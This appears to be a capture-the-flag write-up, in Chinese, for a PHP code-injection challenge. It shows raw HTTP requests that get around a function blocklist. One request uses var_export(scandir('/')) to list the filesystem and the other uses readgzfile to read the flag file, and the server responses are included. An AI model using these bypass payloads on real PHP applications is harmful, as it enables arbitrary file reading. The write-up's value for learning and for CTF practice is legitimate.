# mlzx_web69

禁用 `var_dump` `file_get_contents` `echo` `readfile` ，对 `include` 增加了限制

获取 flag 位置

```http
POST / HTTP/1.1
Host: 192.168.128.131:32807
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

c=var_export(scandir('/'));
```

```http
HTTP/1.1 200 OK
Date: Wed, 05 Nov 2025 04:24:56 GMT
Server: Apache/2.4.65 (Debian) PHP/8.2.29
X-Powered-By: PHP/8.2.29
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Content-Length: 344

array ( 0 => '.', 1 => '..', 2 => '.dockerenv', 3 => 'bin', 4 => 'boot', 5 =>
'dev', 6 => 'entrypoint.sh', 7 => 'etc', 8 => 'flag9527.txt', 9 => 'home', 10 =>
'lib', 11 => 'lib64', 12 => 'media', 13 => 'mnt', 14 => 'opt', 15 => 'proc', 16
=> 'root', 17 => 'run', 18 => 'sbin', 19 => 'srv', 20 => 'sys', 21 => 'tmp', 22
=> 'usr', 23 => 'var', )
```

![image-20251105122558144](assets/image-20251105122558144.png)

获取 flag

```http
POST / HTTP/1.1
Host: 192.168.128.131:32807
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

c=readgzfile('/flag9527.txt');
```

```http
HTTP/1.1 200 OK
Date: Wed, 05 Nov 2025 04:30:18 GMT
Server: Apache/2.4.65 (Debian) PHP/8.2.29
X-Powered-By: PHP/8.2.29
Content-Type: text/html; charset=UTF-8
Content-Length: 30

flag{GZCTF_dynamic_flag_test}
```

![image-20251105123113124](assets/image-20251105123113124.png)